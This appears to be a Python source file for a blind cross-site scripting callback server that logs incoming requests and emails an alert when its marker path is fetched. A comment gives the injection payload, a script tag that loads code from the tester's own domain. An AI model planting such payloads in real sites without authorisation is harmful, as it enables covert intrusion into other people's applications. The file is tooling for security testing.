from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import smtplib
import logging

emaillogin = ''
emailpass = ''
senderemail = ''
rcptemail = ''
smtpserver = ''
smtpport = 


logging.basicConfig(filename='blindxss.log', level=logging.INFO)

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        #mimetype='application/javascript'
        self.send_response(200)
        self.end_headers()
        #self.send_header('Content-type',mimetype)
        #self.wfile.write(b'<script>alert(document.location)</script>')
        referer = self.headers.get('Referer')
        hosthead = self.headers.get('Host')
        client_address = (self.address_string())
      
        """
        We are injecting a payload like: 
        <script src=//DOMAIN:4443/BxXxSxS></script>
        with a specific path just in case we get 
        a random client connection.  Either way
        both connections will be logged and a
        notification sent.  
        """
        if self.path == "/BxXxSxS":
            logging.warning(client_address + " " + "reached out" + " " + "trying to access path: " + self.path + "," + "Referer: " + str(referer) + "," + " Host Header: " + str(hosthead))
            s = smtplib.SMTP(smtpserver, smtpport)
            s.ehlo()
            s.starttls()
            s.login(emaillogin, emailpass)
            s.sendmail(senderemail, rcptemail, 'Subject: Blind XSS for: ' + client_address + '. which accessed path:' + self.path + "," + "Referer:" + str(referer) + "," + " Host Header:" + str(hosthead))
        elif self.path == '/favicon.ico':
            pass
        else:
            logging.info(client_address + " " + "reached out" + " " + "trying to access path: " + self.path+"," + " " + "Referer: " + str(referer) + "," + " Host Header: " + str(hosthead) + "," + "might need to check it")

httpd = HTTPServer(('localhost', 4443), SimpleHTTPRequestHandler)
    

#openssl req -newkey rsa:2048 -nodes -keyout newkey.key -x509 -days 365 -out newcert.crt
httpd.socket = ssl.wrap_socket (httpd.socket, 
        keyfile="newkey.key", 
        certfile='newcert.crt', server_side=True)
        

httpd.serve_forever()
